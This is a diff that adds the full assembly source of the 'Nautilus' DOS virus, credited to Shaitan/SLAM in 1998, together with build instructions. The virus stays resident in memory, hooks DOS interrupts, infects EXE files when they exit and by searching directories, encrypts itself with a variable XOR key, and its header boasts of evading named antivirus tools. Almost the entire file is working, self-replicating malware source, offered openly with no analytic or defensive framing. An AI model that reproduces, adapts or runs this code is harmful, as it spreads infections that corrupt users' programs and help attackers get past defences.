@@ -1,0 +1,696 @@
+;------------------------------------------------------------------------------
+; NAUTILUS.ASM - The Nautilus Virus Source Code (c) '98 The Shaitan/SLAM
+;
+; To compile, use:
+; TASM /m2 nautilus.asm
+; TLINK nautilus.obj
+;
+; FEATURES:
+; * Multi-OS Virus: DOS/Windoze/OS2 Warp infection
+; * TSR + Direct infection of EXE/COM
+; * Infection on exit (yes, not execute!)
+; * Self-encrypting with 8-bit variable encryption
+; * Stealth (can infect even F-PROT/TBAV/AVP etc without problems!)
+; * And more... :)
+;
+; NOTE:
+;     The technique used by Nautilus has already been exploited by Casio [SLAM]
+; and Jacky Qwerty [29A]. But I found the technique so interesting, that I just
+; *had* to do an implementation of it myself :).
+;
+;------------------------------------------------------------------------------
+.model tiny
+JUMPS
+
+virus_size      equ     1873
+code_size       equ     virus_size - 512
+
+.STACK 30
+
+.CODE
+org 0
+begin:
+        mov     si,offset encrypt_begin      ; SI = Start of encrypted code
+        mov     cx,encrypt_end-encrypt_begin ; CX = No. of bytes to decrypt
+decrypt_loop:
+        db      2eh,80h,34h             ; XOR BYTE PTR CS:[SI],KEY
+key     db      0                       ; "     "       "       "
+        inc     si                      ; Increment SI
+        loop    decrypt_loop            ; Loop till all bytes are decrypted
+
+encrypt_begin:
+        mov     ax,ds                   ; Set AX to current data segment
+        mov     word ptr cs:[_ds],ax    ; Save it
+
+        mov     ax,word ptr ds:[02ch]   ; Retrieve Environment segment
+        mov     es,ax                   ; Set ES to environment segment
+        mov     di,0                    ; ES:DI now points to environment
+        mov     al,01h                  ; Search for 01h
+        mov     cx,4196                 ; Search upto 4k bytes
+        cld                             ; Clear direction flag
+        repne   scasb                   ; Search...
+        inc     di                      ; ES:DI = End of environment
+
+        push    es                      ; Set DS to ES
+        pop     ds                      ; "     "       "
+        mov     si,di                   ; DS:SI = Path/Filename of host
+        push    cs                      ; Set ES to CS
+        pop     es                      ; "     "       "
+        mov     di,offset hostname      ; ES:DI = Buffer to copy filename to...
+        call    strcpy                  ; Copy the ASCIIZ string to buffer
+
+chk_tsr:
+        mov     ax,0c0c0h               ; Our "Are we TSR?" call...
+        int     21h                     ; Call DOS
+        cmp     ax,0d0d0h               ; Are we resident already?
+        jne     go_tsr                  ; No. Go TSR now!
+        mov     word ptr cs:[virus_seg],bx ; Retrieve our location in memory
+        jmp     tsr_end                 ; Jump over installation routines...
+
+go_tsr:
+        mov     ah,52h                  ; DOS "Get List of Lists" call
+        int     21h                     ; Call DOS
+        mov     ax,word ptr es:[bx-2]   ; Get segment of first MCB in AX
+mem_loop:
+        mov     ds,ax                   ; Set DS to next MCB
+        cmp     byte ptr ds:[0000h],'Z' ; Is this the last MCB?
+        je      end_mem_loop            ; Exit loop
+        add     ax,word ptr ds:[0003h]  ; Get next MCB
+        inc     ax                      ; One block for MCB header
+        jmp     mem_loop                ; Loop
+
+end_mem_loop:
+        sub     word ptr ds:[0003h],256 ; Reserve 4 kb worth of memory
+
+        add     ax,word ptr ds:[0003h]  ; Calculate location of
+        inc     ax                      ; virus in memory
+
+        mov     word ptr cs:[virus_seg],ax ; Save location of virus in memory
+
+copy_virus_to_mem:
+        mov     es,ax                   ; Set ES
+        mov     di,0                    ; Set DI ,ES:DI = Virus mem location
+        mov     ax,cs                   ; Get current segment
+        mov     ds,ax                   ; Set DS to current segment
+        mov     si,0                    ; Set SI to start of virus source
+        mov     cx,code_size            ; Size of virus code
+        cld                             ; Direction = UP
+        rep     movsb                   ; Copy all the bytes
+
+        push    es                      ; Set DS to ES
+        pop     ds                      ; "     "       "
+
+get_set_vectors:
+        mov     ax,3521h                ; Get vector for INT 21h
+        int     21h                     ; Call DOS
+        mov     word ptr ds:[old21+2],es; Save segment of original handler
+        mov     word ptr ds:[old21+0],bx; Save offset of original handler
+
+        mov     ax,2521h                ; Set new vector for INT 21h
+        mov     dx,offset new21         ; DS:DX = New INT 21h handler
+        int     21h                     ; Call DOS
+
+        mov     ax,3520h                ; Get vector for INT 20h
+        int     21h                     ; Call DOS
+        mov     word ptr ds:[old20+2],es; Save segment of original handler
+        mov     word ptr ds:[old20+0],bx; Save offset of original handler
+
+        mov     ax,2520h                ; Set new vector for Int 20h
+        mov     dx,offset new20         ; DS:DX = new INT 20h handler
+        int     21h                     ; Call DOS
+
+copy_exe_2_mem:
+        push    cs                      ; Set DS to CS
+        pop     ds                      ; "     "       "
+        mov     dx,offset hostname      ; DS:DX = Path/Filename of host
+        call    openfile                ; Open the host file
+        xchg    ax,bx                   ; Save handle in BX
+
+        mov     ax,word ptr cs:[virus_seg] ; Set DS to virus memory segment
+        mov     ds,ax                   ; "     "       "       "       "
+        mov     dx,code_size            ; DS:DX = Buffer to read data to
+        mov     cx,virus_size           ; No. of bytes to read
+        call    readfile                ; Read the host file
+
+        mov     ah, byte ptr cs:[key]   ; Get the saved encryption key
+        call    encrypt_in_mem          ; Decrypt in memory
+
+        mov     word ptr ds:[code_size+12h],'AR' ; Our infection marker...
+        mov     word ptr ds:[code_size+offset g1_marker+512],'I' ;
+
+        call    closefile               ; Close the host file
+
+tsr_end:
+        cmp     byte ptr cs:[g1_marker],'O' ; Is this Generation-1?
+        je      quit                        ; Yes. Exit!
+
+restore_host:
+        push    cs                      ; Set DS to CS
+        pop     ds                      ; "     "       "
+        mov     dx,offset hostname      ; DS:DX = Path/filename of host
+
+        push    ds                      ; Save DS
+        push    dx                      ; Save DX
+        call    saveattrib              ; Save the host file attributes
+
+        call    stripattrib             ; Remove all access restrictions
+
+        call    openfile                ; Open the host file
+        jc      restore_fail            ; Error! Cannot continue...
+        xchg    ax,bx                   ; Save handle in BX
+
+        call    savedate                ; Save the host file date
+
+        call    gotoeof                 ; Seek to end of file
+        sub     ax,virus_size           ; Decrease by length of virus
+        sbb     dx,0                    ; "     "       "       "       "
+
+        mov     cx,dx                   ; Set CX:DX to original end of host
+        mov     dx,ax                   ; "     "       "       "       "
+        push    cx                      ; Save CX
+        push    dx                      ; Save DX
+        mov     ax,4200h                ; Seek to original end of host
+        int     21h                     ; Call DOS
+
+        mov     ax,word ptr cs:[virus_seg] ; Set DS to virus memory location
+        mov     ds,ax                      ; "          "       "       "
+        mov     dx,code_size+virus_size    ; DS:DX = Buffer to hold read data
+        mov     cx,virus_size              ; No. of bytes to read
+        call    readfile                   ; Read the file
+
+        pop     dx                      ; Restore DX
+        pop     cx                      ; Restore CX
+        mov     ax,4200h                ; Seek to original end of host
+        int     21h                     ; Call DOS
+
+        mov     cx,0                    ; Write 0 bytes
+        call    writefile               ; Truncate the file
+
+        call    gotobof                 ; Goto beginning of file
+
+        mov     dx,code_size+virus_size ; DS:DX = Buffer to write data from
+        mov     cx,virus_size           ; No. of bytes to write
+        call    writefile               ; Write back the original host data
+
+        call    restoredate             ; Restore host file date
+
+        call    closefile               ; Close the host file
+
+restore_fail:
+        pop     dx                      ; Restore DX
+        pop     ds                      ; Restore DS
+        call    restoreattrib           ; Restore host file attributes
+
+run_host:
+        mov     ax,word ptr cs:[_ds]    ; Get back saved DS
+        mov     ds,ax                   ; Restore original DS
+
+        push    ds                      ; Set ES to DS
+        pop     es                      ; "     "       "
+        mov     bx,256                  ; Re-size block to 4k
+        mov     ah,4ah                  ; DOS re-size memory block call
+        int     21h                     ; Call DOS
+
+        mov     ax,ss                   ; Get current stack segment
+        mov     word ptr cs:[_ss],ax    ; Save it
+        mov     word ptr cs:[_sp],sp    ; Save stack pointer
+
+        mov     word ptr cs:[par_cmd],80h  ;
+        mov     ax,ds                      ;
+        mov     word ptr cs:[par_cmd+2],ax ;
+        mov     ax,4b00h                ;
+        push    cs                      ;
+        pop     es                      ;
+        mov     bx,offset par_blk       ;
+        push    cs                      ;
+        pop     ds                      ;
+        mov     dx,offset hostname      ;
+        int     21h                     ;
+
+        mov     ax,word ptr cs:[_ss]    ;
+        cli                             ;
+        mov     ss,ax                   ;
+        mov     sp,word ptr cs:[_sp]    ;
+        sti                             ;
+
+        call    direct_infect           ;
+
+quit:
+show_string:
+        push    cs                      ;
+        pop     ds                      ;
+        mov     ah,9h                   ;
+        mov     dx,offset copyright     ;
+        int     21h                     ;
+
+        mov     ax,4c00h                ; DOS exit call
+        int     21h                     ; Exit to DOS!
+
+;------------------------------------------------------------------------------
+new21:
+        cmp     ax,0c0c0h               ;
+        jne     chk_other               ;
+        mov     ax,0d0d0h               ;
+        mov     bx,cs                   ;
+        iret                            ;
+
+chk_other:
+s_flags:
+        push    ax                      ;
+        push    bx                      ;
+        push    cx                      ;
+        push    dx                      ;
+        push    si                      ;
+        push    di                      ;
+        push    ds                      ;
+        push    es                      ;
+        pushf                           ;
+
+
+chk_exec:
+        cmp     ah,4bh                  ;
+        jne     chk_exit                ;
+
+        mov     si,dx                   ;
+        mov     di, offset hostname     ;
+        push    cs                      ;
+        pop     es                      ;
+        call    strcpy                  ;
+        mov     byte ptr cs:[infection_flag],1 ;
+        jmp     r_flags                 ;
+
+chk_exit:
+exit_4c:
+        cmp     ah,4ch                  ;
+        je      infect_on_exit          ;
+exit_0:
+        cmp     ah,0                    ;
+        je      infect_on_exit          ;
+exit_31:
+        cmp     ah,31h                  ;
+        jne     r_flags                 ;
+infect_on_exit:
+        cmp     byte ptr cs:[infection_flag],1 ;
+        jne     r_flags                 ;
+        mov     byte ptr cs:[infection_flag],0 ;
+        mov     ax,cs                   ;
+        mov     word ptr cs:[virus_seg],ax ;
+        push    cs                      ;
+        pop     ds                      ;
+        mov     dx,offset hostname      ;
+        call    infect_file             ;
+
+r_flags:
+        popf                            ;
+        pop     es                      ;
+        pop     ds                      ;
+        pop     di                      ;
+        pop     si                      ;
+        pop     dx                      ;
+        pop     cx                      ;
+        pop     bx                      ;
+        pop     ax                      ;
+
+olddos:
+        jmp     dword ptr cs:[old21]    ;
+
+;------------------------------------------------------------------------------
+new20:
+        push    ax                      ;
+        push    bx                      ;
+        push    cx                      ;
+        push    dx                      ;
+        push    si                      ;
+        push    di                      ;
+        push    ds                      ;
+        push    es                      ;
+        pushf                           ;
+
+        cmp     byte ptr cs:[infection_flag],1 ;
+        jne     restore_flags                  ;
+        mov     byte ptr cs:[infection_flag],0 ;
+        mov     ax,cs                          ;
+        mov     word ptr cs:[virus_seg],ax     ;
+        push    cs                             ;
+        pop     ds                             ;
+        mov     dx,offset hostname             ;
+        call    infect_file                    ;
+
+restore_flags:
+        popf                            ;
+        pop     es                      ;
+        pop     ds                      ;
+        pop     di                      ;
+        pop     si                      ;
+        pop     dx                      ;
+        pop     cx                      ;
+        pop     bx                      ;
+        pop     ax                      ;
+
+        jmp     dword ptr cs:[old20]    ;
+
+
+;------------------------------------------------------------------------------
+infect_file:
+        mov     byte ptr cs:[infect_success],0 ;
+
+        push    ds                      ;
+        push    dx                      ;
+
+        call    chk_fname                  ;
+        cmp     byte ptr cs:[fname_flag],1 ;
+        jne     infect_end                 ;
+
+        call    saveattrib              ;
+
+        call    stripattrib             ;
+
+        call    openfile                ;
+        jc      infect_end              ;
+        xchg    ax,bx                   ;
+
+        call    savedate                ;
+
+        mov     ax,word ptr cs:[virus_seg] ;
+        mov     ds,ax                   ;
+        mov     dx,code_size+virus_size ;
+        mov     cx,virus_size           ;
+        call    readfile                ;
+
+        cmp     word ptr ds:[code_size+virus_size+12h],'AR' ;
+        je      infect_close            ;
+
+        call    make_key                ;
+
+        mov     byte ptr ds:[code_size+512+offset key],ah ;
+
+        push    ax                      ;
+        call    encrypt_in_mem          ;
+
+        call    gotobof                 ;
+
+        mov     dx,code_size            ;
+        mov     cx,virus_size           ;
+        call    writefile               ;
+
+        pop     ax                      ;
+        call    encrypt_in_mem          ;
+
+        call    gotoeof                 ;
+
+        mov     dx,code_size+virus_size ;
+        mov     cx,virus_size           ;
+        call    writefile               ;
+
+        mov     byte ptr cs:[infect_success],1 ;
+
+infect_close:
+        call    restoredate             ;
+
+        call    closefile               ;
+
+infect_end:
+        pop     dx                      ;
+        pop     ds                      ;
+
+        call    restoreattrib           ;
+
+        ret                             ;
+
+;------------------------------------------------------------------------------
+direct_infect:
+        mov     byte ptr cs:[infect_counter],0 ;
+
+        mov     ah,2fh                  ;
+        int     21h                     ;
+        mov     word ptr cs:[olddta+2],es ;
+        mov     word ptr cs:[olddta+0],bx ;
+
+        push    cs                      ;
+        pop     ds                      ;
+        mov     dx,offset newdta        ;
+        call    setdta                  ;
+
+        mov     dx,offset exematch      ;
+        call    findfirst               ;
+        jc      di_exit                 ;
+        mov     dx,offset newdta+1eh    ;
+        call    infect_file             ;
+        cmp     byte ptr cs:[infect_success],1 ;
+        jne     di_loop                        ;
+        inc     byte ptr cs:[infect_counter]   ;
+
+di_loop:
+        call    findnext                       ;
+        jc      di_exit                        ;
+        mov     dx,offset newdta+1eh           ;
+        call    infect_file                    ;
+        cmp     byte ptr cs:[infect_success],1 ;
+        jne     di_loop                        ;
+        inc     byte ptr cs:[infect_counter]   ;
+        cmp     byte ptr cs:[infect_counter],2 ;
+        jne     di_loop                        ;
+
+di_exit:
+        mov     ax,word ptr cs:[olddta+2]  ;
+        mov     ds,ax                      ;
+        mov     dx,word ptr cs:[olddta+0]  ;
+        call    setdta                     ;
+
+        ret                                ;
+
+;------------------------------------------------------------------------------
+setdta:
+        mov     ah,1ah                  ; DOS set new DTA call
+        int     21h                     ; Call DOS
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+findfirst:
+        mov     ah,4eh                  ; DOS find first call
+        mov     cx,7                    ; Look for every type of file
+        int     21h                     ; Call DOS
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+findnext:
+        mov     ah,4fh                  ; DOS find next file call
+        int     21h                     ; Call DOS
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+openfile:
+        mov     ax,3d02h                ; Open file in read/write mode
+        int     21h                     ; Call DOS
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+closefile:
+        mov     ah,3eh                  ; DOS close file call
+        int     21h                     ; Call DOS
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+readfile:
+        mov     ah,3fh                  ; DOS read from file call
+        int     21h                     ; Call DOS
+        ret                             ; Return to DOS
+
+;------------------------------------------------------------------------------
+writefile:
+        mov     ah,40h                  ; DOS write to file call
+        int     21h                     ; Call to DOS
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+gotobof:
+        mov     ax,4200h                ;
+        xor     cx,cx                   ;
+        xor     dx,dx                   ;
+        int     21h                     ;
+        ret
+
+;------------------------------------------------------------------------------
+gotoeof:
+        mov     ax,4202h                ;
+        xor     cx,cx                   ;
+        xor     dx,dx                   ;
+        int     21h                     ;
+        ret                             ;
+
+;------------------------------------------------------------------------------
+saveattrib:
+        mov     ax,4300h                ;
+        int     21h                     ;
+        mov     word ptr cs:[ori_attrib],cx ;
+        ret                             ;
+
+;------------------------------------------------------------------------------
+stripattrib:
+        mov     ax,4301h                ;
+        mov     cx,0                    ;
+        int     21h                     ;
+        ret
+
+;------------------------------------------------------------------------------
+restoreattrib:
+        mov     ax,4301h                ;
+        mov     cx,word ptr cs:[ori_attrib] ;
+        int     21h                     ;
+        ret
+
+;------------------------------------------------------------------------------
+savedate:
+        mov     ax,5700h                ;
+        int     21h                     ;
+        mov     word ptr cs:[ori_date],dx ;
+        mov     word ptr cs:[ori_time],cx ;
+        ret                             ;
+
+;------------------------------------------------------------------------------
+restoredate:
+        mov     ax,5701h                ;
+        mov     dx,word ptr cs:[ori_date] ;
+        mov     cx,word ptr cs:[ori_time] ;
+        int     21h                     ;
+        ret                             ;
+
+;------------------------------------------------------------------------------
+make_key:
+        mov     ah,2ch                  ;
+        int     21h                     ;
+        mov     ah,ch                   ;
+        add     ah,cl                   ;
+        add     ah,dh                   ;
+        add     ah,dl                   ;
+        inc     ah                      ;
+        ret                             ;
+
+;------------------------------------------------------------------------------
+encrypt_in_mem:
+        mov     si,code_size+512+offset encrypt_begin ;
+        mov     cx,encrypt_end-encrypt_begin ;
+mem_encrypt_loop:
+        xor     byte ptr ds:[si],ah     ;
+        inc     si                      ;
+        loop    mem_encrypt_loop        ;
+        ret                             ;
+
+;------------------------------------------------------------------------------
+strcpy:
+        cld                             ; Clear direction flag
+hncopy_loop:
+        movsb                           ; Copy one byte from DS:SI to ES:DI
+        cmp     byte ptr ds:[si],0      ; Is this end of string?
+        jne     hncopy_loop             ; Nope. Loop till done...
+        movsb                           ; Copy the trailing 0 too!
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+chk_fname:
+        push    ds                      ; Save DS
+        push    dx                      ; Save DX
+
+        mov     di,dx                   ; Set ES:DI to start of filename
+        push    ds                      ; "     "       "       "       "
+        pop     es                      ; "     "       "       "       "
+        xor     al,al                   ; Search for 0
+        mov     cx,128                  ; Search upto 128 bytes
+        cld                             ; Clear direction flag
+        repne   scasb                   ; Search...
+
+        mov     byte ptr cs:[fname_flag],0 ; Initialize the flag
+
+chk_command:
+        cmp     word ptr es:[di-12],'OC'; COMMAND.COM ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_win:
+        cmp     word ptr es:[di-8],'IW' ; WIN.COM ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_user:
+        cmp     word ptr es:[di-9],'SU' ; USER.EXE ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_gdi:
+        cmp     word ptr es:[di-8],'DG' ; GDI.EXE ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_krnl:
+        cmp     word ptr es:[di-12],'RK'; KRNL386.EXE ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_con:
+        cmp     word ptr es:[di-13],'OC'; CONAGENT.EXE ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_explor:
+        cmp     word ptr es:[di-13],'XE'; EXPLORER.EXE ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_sdrv:
+        cmp     word ptr es:[di-13],'MS'; SMARTDRV.EXE ?
+        je      chk_fname_end           ; Yes. Jump...
+
+chk_emm:
+        cmp     word ptr es:[di-11],'ME'; EMM386.EXE ?
+        je      chk_fname_end           ; Yes. Jump...
+
+fname_ok:
+        mov     byte ptr cs:[fname_flag],1 ; Set flag as "Ok to infect" state
+
+chk_fname_end:
+        pop     dx                      ; Restore DX
+        pop     ds                      ; REstore DS
+        ret                             ; Return to caller
+
+;------------------------------------------------------------------------------
+virus_data:
+copyright       db      "[The Nautilus Virus (c) '98 Shaitan]$"
+
+old21           dd      ?
+old20           dd      ?
+
+olddta          dd      ?
+newdta          db      43 dup (?)
+
+exematch        db      "*.EXE",0
+
+infect_success  db      0
+infect_counter  db      0
+fname_flag      db      0
+
+virus_seg       dw      ?
+
+ori_attrib      dw      ?
+ori_date        dw      ?
+ori_time        dw      ?
+
+par_blk         dw      0
+par_cmd         dd      ?
+                dd      fcb1
+                dd      fcb2
+
+fcb1            db      0
+                db      11 dup(' ')
+                db      25 dup (0)
+
+fcb2            db      0
+                db      11 dup(' ')
+                db      25 dup (0)
+
+hostname        db      128 dup(0)
+
+_ss             dw      ?
+_sp             dw      ?
+_ds             dw      ?
+
+
+infection_flag  db      0
+g1_marker       db      'O'
+
+encrypt_end:
+
+end begin
+;------------------------------------------------------------------------------
